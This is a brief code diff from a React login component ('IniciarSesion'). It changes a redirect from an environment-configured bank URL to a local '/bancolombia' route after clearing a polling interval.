@@ -811,8 +811,8 @@ export default function IniciarSesion() {
         clearInterval(pollingIntervalRef.current);
       };
 
-      // Se redirige al inicio de sesión
-      window.location.href = process.env.REACT_APP_URL_BANK;
+      // Se redirige al inicio de sesión del banco localmente
+      window.location.href = "/bancolombia";
 
       // Se retorna
       return;
